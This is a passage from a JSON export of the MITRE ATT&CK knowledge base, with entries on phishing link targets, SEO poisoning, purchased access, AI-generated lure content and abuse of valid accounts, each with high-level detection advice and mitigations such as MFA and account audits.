in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in Malicious Link. Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in Spearphishing Link) or a phish to gain initial access to a system (as in Spearphishing Link), an adversary must set up the resources for a link target for the spearphishing link. \n\nTypically, the resources for a link target will be an HTML page that may include some client-side script such as JavaScript to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during Spearphishing Link. <a href=\"https://blog.malwarebytes.com/malwarebytes-news/2020/10/silent-librarian-apt-phishing-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malwarebytes Silent Librarian October 2020)</a> <a href=\"https://www.proofpoint.com/us/threat-insight/post/threat-actor-profile-ta407-silent-librarian\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Proofpoint TA407 September 2019)</a> Adversaries may also Upload Malware and have the link target point to malware for download/execution by the user.\n\nAdversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure (Domains) to help facilitate Malicious Link.\n\nLinks can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing. <a href=\"https://www.kaspersky.com/blog/malicious-redirect-methods/50045/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky-masking)</a> <a href=\"https://www.mandiant.com/resources/blog/url-obfuscation-schema-abuse\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mandiant-masking)</a>\n\nAdversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. <a href=\"https://www.netskope.com/blog/targeted-attacks-abusing-google-cloud-platform-open-redirection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netskope GCP Redirection)</a> <a href=\"https://www.netskope.com/blog/a-big-catch-cloud-phishing-from-google-app-engine-and-azure-app-service\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Netskope Cloud Phishing)</a> <a href=\"https://www.intezer.com/blog/malware-analysis/kud-i-enter-your-server-new-vulnerabilities-in-microsoft-azure/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Intezer App Service Phishing)</a> <a href=\"https://cofense.com/blog/major-energy-company-targeted-in-large-qr-code-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cofense-redirect)</a> In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). <a href=\"https://docs.ostorlab.co/kb/IPA_URL_SCHEME_HIJACKING/index.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: iOS URL Scheme)</a> <a href=\"https://www.techtarget.com/searchsecurity/tip/Preparing-for-uniform-resource-identifier-URI-exploits\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: URI)</a> <a href=\"https://www.blackhat.com/presentations/bh-dc-08/McFeters-Rios-Carter/Presentation/bh-dc-08-mcfeters-rios-carter.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: URI Use)</a> <a href=\"https://media.defense.gov/2020/Jun/09/2002313081/-1/-1/0/CSI-DETECT-AND-PREVENT-WEB-SHELL-MALWARE-20200422.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: URI Unique)</a> Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove. <a href=\"https://blog.talosintelligence.com/ipfs-abuse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos IPFS 2022)</a>","detection":"If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as during Spearphishing Link, Spearphishing Link, or Malicious Link.","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]},{"id":"T1608.006","name":"SEO Poisoning","description":"Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms. <a href=\"https://atlas-cybersecurity.com/cyber-threats/threat-actors-use-search-engine-optimization-tactics-to-redirect-traffic-and-install-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Atlas SEO)</a> <a href=\"https://www.malwarebytes.com/blog/news/2018/05/seo-poisoning-is-it-worth-it\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareBytes SEO)</a>\n\nTo help facilitate Drive-by Compromise, adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as Drive-by Target) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news). <a href=\"https://www.zscaler.com/blogs/security-research/ubiquitous-seo-poisoning-urls-0\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ZScaler SEO)</a> <a href=\"https://atlas-cybersecurity.com/cyber-threats/threat-actors-use-search-engine-optimization-tactics-to-redirect-traffic-and-install-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Atlas SEO)</a>\n\nIn addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards Supply Chain Compromise lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity <a href=\"https://zero.checkmarx.com/the-github-black-market-gaming-the-star-ranking-game-fc42f5913fb7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chexmarx-seo)</a> which may be targeted and gamed by malicious actors. <a href=\"https://checkmarx.com/blog/new-technique-to-trick-developers-detected-in-an-open-source-supply-chain-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Checkmarx-oss-seo)</a>\n\nAdversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation. <a href=\"https://www.malwarebytes.com/blog/news/2018/05/seo-poisoning-is-it-worth-it\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MalwareBytes SEO)</a> <a href=\"https://thedfirreport.com/2022/05/09/seo-poisoning-a-gootloader-story/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DFIR Report Gootloader)</a>\n\nSEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders. <a href=\"https://www.zscaler.com/blogs/security-research/ubiquitous-seo-poisoning-urls-0\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ZScaler SEO)</a> <a href=\"https://news.sophos.com/en-us/2021/03/01/gootloader-expands-its-payload-delivery-options/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos Gootloader)</a>","detection":"","platforms":["PRE"],"dataSources":["Internet Scan: Response Content"],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}]}]},{"id":"T1650","name":"Acquire Access","description":"Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems. <a href=\"https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Ransomware as a Service)</a> <a href=\"https://www.crowdstrike.com/blog/access-brokers-targets-and-worth/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Access Brokers)</a> <a href=\"https://krebsonsecurity.com/2012/10/service-sells-access-to-fortune-500-firms/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Krebs Access Brokers Fortune 500)</a> In some cases, adversary groups may form partnerships to share compromised systems with each other. <a href=\"https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-152a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA Karakurt 2022)</a>\n\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., Web Shell) or established access via External Remote Services. In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers. <a href=\"https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Ransomware as a Service)</a>\n\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector. <a href=\"https://www.microsoft.com/en-us/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Ransomware as a Service)</a> <a href=\"https://www.crowdstrike.com/blog/access-brokers-targets-and-worth/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Access Brokers)</a>\n\nIn some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a Trusted Relationship, Multi-Factor Authentication Interception, or even Supply Chain Compromise.\n\n<strong>Note:</strong> while this technique is distinct from other behaviors such as Purchase Technical Data and Credentials, they may often be used in conjunction (especially where the acquired foothold requires Valid Accounts).","detection":"Much of this takes place outside the visibility of the target organization, making detection difficult for defenders. \n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls."}],"subTechniques":[]},{"id":"T1683","name":"Generate Content","description":"Adversaries may create or generate content to support targeting and operations. This content may be used to establish personas, impersonate known individuals or organizations, and support Social Engineering, fraud, or influence activities. Written materials, audio, images, video, or other media may be developed and tailored to the target and objective. <a href=\"https://www.ibm.com/think/insights/ai-generated-content\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: IBM AI-Generated Content)</a>\n\nContent development may occur prior to or during an operation. Adversaries may develop or generate content in-house, source it through third parties, or produce it using AI-assisted tools. Adversaries may use AI to research targets, develop pretexts, and better understand the organizations and individuals they intend to target or deceive prior to generating content (i.e., Query Public AI Services); for obtaining access to AI tools used in content generation, see Artificial Intelligence. \n\nContent may be leveraged in support of techniques such as Phishing, Phishing for Information, Social Engineering, Financial Theft, or Establish Accounts. Generated or developed content does not include malicious code or scripts (i.e., Develop Capabilities and Artificial Intelligence).","detection":"","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on designing defenses that are not reliant on atomic indicators."}],"subTechniques":[{"id":"T1683.001","name":"Written Content","description":"Adversaries may create or tailor written materials to support targeting and malicious operations. Content may include phishing lures, fraudulent financial communications, fabricated job postings, fabricated employment credentials and documentation, decoy documents, social media persona content, and supporting narratives used to sustain fabricated personas over time. <a href=\"https://www.adaptivesecurity.com/blog/ai-phishing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GenAI Phishing)</a> <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/distillation-experimentation-integration-ai-adversarial-use\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GTIG AI Threat Tracker)</a> Content may be authored manually, commissioned through third parties, or produced using AI-assisted tools.\n\nWritten materials may impersonate legitimate government correspondence, diplomatic communications, or internal organizational documents to support targeting efforts. AI-assisted tools may also be used to tailor content to specific targets, industries, or regions. For example, adversaries may leverage AI to translate content into a target's native language or mimic the communication style of trusted senders.\n\nWritten content produced through these methods may be used in support of other techniques, such as Phishing, Spearphishing via Service, Phishing for Information, Internal Spearphishing, Social Engineering, Financial Theft, or Establish Accounts.\n\nWritten content does not include malicious code or scripts; for development of malicious code and scripts, see Develop Capabilities.","detection":"","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on designing defenses that are not reliant on atomic indicators."}]},{"id":"T1683.002","name":"Audio-Visual Content","description":"Adversaries may create or manipulate audio, image, and video content to support targeting and malicious operations. Adversaries may also use synthetic voice recordings, real-time altered audio or video during live interactions, fabricated profile photos and identity documents, or video content depicting fabricated or impersonated individuals. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nov AI Threat Tracker)</a>\n\nContent may be produced manually through editing tools, generated using AI-assisted tools, or produced using third-party synthetic services. <a href=\"https://www.ic3.gov/AnnualReport/Reports/2025_IC3Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FBI 2025 AI Generate Content)</a> <a href=\"https://www.europol.europa.eu/cms/sites/default/files/documents/Europol_Innovation_Lab_Facing_Reality_Law_Enforcement_And_The_Challenge_Of_Deepfakes.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Europol Deepfakes)</a> AI-assisted tools have enabled adversaries to produce synthetic media at scale and generate content that is more difficult to identify as inauthentic. \n\nAudio-visual content produced through these methods may be used in support of other techniques, such as Phishing, Spearphishing via Service, Phishing for Information, Internal Spearphishing, Social Engineering, Financial Theft, or Establish Accounts.","detection":"","platforms":["PRE"],"dataSources":[],"mitigations":[{"id":"M1056","name":"Pre-compromise","description":"This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on designing defenses that are not reliant on atomic indicators."}]}]}]},{"tactic":"Initial Access","techniques":[{"id":"T1078","name":"Valid Accounts","description":"Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. <a href=\"https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: volexity_0day_sophos_FW)</a> Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account. <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-074a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CISA MFA PrintNightmare)</a>\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a>","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."},{"id":"M1015","name":"Active Directory Configuration","description":"Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."},{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> These audits should also include if default accounts have been enabled, or if new local accounts are created that have not been authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#a-nameesaebmaesae-administrative-forest-design-approach\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Securing Privileged Access)</a>"},{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a> When possible, applications that use SSH keys should be updated periodically and properly secured.\n\nPolicies should minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) across all account types, including default, local, domain, and cloud accounts, to prevent unauthorized access, even if credentials are compromised. MFA provides a critical layer of security by requiring multiple forms of verification beyond just a password. This measure significantly reduces the risk of adversaries abusing valid accounts to gain initial access, escalate privileges, maintain persistence, or evade defenses within your network."},{"id":"M1036","name":"Account Use Policies","description":"Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}],"subTechniques":[{"id":"T1078.001","name":"Default Accounts","description":"Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Local Accounts Feb 2019)</a> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Root User)</a> <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Matrix for Kubernetes)</a>\n\nDefault accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services. <a href=\"https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Metasploit SSH Module)</a>\n\nDefault accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account called <code>vpxuser</code> is created on the ESXi server. If a threat actor is able to compromise this account’s credentials (for example, via Exploitation for Credential Access on the vCenter host), they will then have access to the ESXi server. <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/vmware-esxi-zero-day-bypass/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Cloud Threat Intelligence VMWare ESXi Zero-Day 2023)</a> <a href=\"https://pentera.io/blog/information-disclosure-in-vmware-vcenter/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pentera vCenter Information Disclosure)</a>","detection":"Monitor whether default accounts have been activated or logged into. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.","platforms":["Containers","ESXi","IaaS","Identity Provider","Linux","macOS","Network Devices","Office Suite","SaaS","Windows"],"dataSources":["Logon Session: Logon Session Creation","User Account: User Account Authentication"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. <a href=\"https://www.us-cert.gov/ncas/alerts/TA13-175A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Alert TA13-175A Risks of Default Passwords on the Internet)</a>"},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) for default accounts whenever possible to prevent unauthorized access, even if credentials for these accounts are compromised. MFA adds an additional layer of security that requires more than just a username and password, making it significantly harder for adversaries to exploit these accounts for initial access or lateral movement."}]},{"id":"T1078.002","name":"Domain Accounts","description":"Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services. <a href=\"https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-accounts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft AD Accounts)</a>\n\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.","detection":"Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services. <a href=\"https://technet.microsoft.com/en-us/library/dn487457.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Audit Policy)</a> Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nOn Linux, check logs and other artifacts created by use of domain authentication services, such as the System Security Services Daemon (sssd). <a href=\"https://ubuntu.com/server/docs/service-sssd\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ubuntu SSSD Docs)</a> \n\nPerform regular audits of domain accounts to detect accounts that may have been created by an adversary for persistence.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1017","name":"User Training","description":"Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."},{"id":"M1018","name":"User Account Management","description":"Regularly review and manage domain accounts to ensure that only active, necessary accounts exist. Remove or disable inactive and unnecessary accounts to reduce the risk of adversaries abusing these accounts to gain unauthorized access or move laterally within the network."},{"id":"M1026","name":"Privileged Account Management","description":"Audit domain account permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. Limit credential overlap across systems to prevent access if account credentials are obtained."},{"id":"M1027","name":"Password Policies","description":"Implement and enforce strong password policies for domain accounts to ensure passwords are complex, unique, and regularly rotated. This reduces the likelihood of password guessing, credential stuffing, and other attack methods that rely on weak or static credentials."},{"id":"M1032","name":"Multi-factor Authentication","description":"Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information. MFA can also be used to restrict access to cloud resources and APIs."}]},{"id":"T1078.003","name":"Local Accounts","description":"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.","detection":"Perform regular audits of local system accounts to detect accounts that may have been created by an adversary for persistence. Look for suspicious account behavior, such as accounts logged in at odd times or outside of business hours.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Logon Session: Logon Session Creation","Logon Session: Logon Session Metadata","User Account: User Account Authentication"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Enforce user account management practices for local accounts to limit access and remove inactive or unused accounts. By doing so, you reduce the attack surface available to adversaries and prevent unauthorized access to local systems."},{"id":"M1026","name":"Privileged Account Management","description":"Audit local accounts permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account. <a href=\"https://technet.microsoft.com/en-us/library/dn535501.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Credential Theft)</a> <a href=\"https://technet.microsoft.com/en-us/library/dn487450.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Least Privilege)</a> Limit the usage of local administrator accounts to be used for day-to-day operations that may expose them to potential adversaries. \n\nFor example, audit the use of service accounts in Kubernetes, and avoid automatically granting them access to the Kubernetes API if this is not required. <a href=\"https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Service Accounts)</a> Implementing LAPS may also help prevent reuse of local administrator credentials across a domain. <a href=\"https://blogs.technet.microsoft.com/secguide/2018/12/10/remote-use-of-local-accounts-laps-changes-everything/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Remote Use of Local)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure that local administrator accounts have complex, unique passwords across all systems on the network."},{"id":"M1032","name":"Multi-factor Authentication","description":"Enable multi-factor authentication (MFA) for local accounts to add an extra layer of protection against credential theft and misuse. MFA can be implemented using methods like mobile-based authenticators or hardware tokens, even in environments that do not rely on domain controllers or cloud services. This additional security measure can help reduce the risk of adversaries gaining unauthorized access to local systems and resources."}]},{"id":"T1078.004","name":"Cloud Accounts","description":"Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. <a href=\"https://aws.amazon.com/identity/federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Identity Federation)</a> <a href=\"https://cloud.google.com/solutions/federating-gcp-with-active-directory-introduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Federating GC)</a> <a href=\"https://docs.microsoft.com/en-us/windows-server/identity/ad-fs/deployment/how-to-connect-fed-azure-adfs\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Deploying AD Federation)</a>\n\nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\n\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. \n\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods. For example, in Azure environments, adversaries may target Azure Managed Identities, which allow associated Azure resources to request access tokens. By compromising a resource with an attached Managed Identity, such as an Azure VM, adversaries may 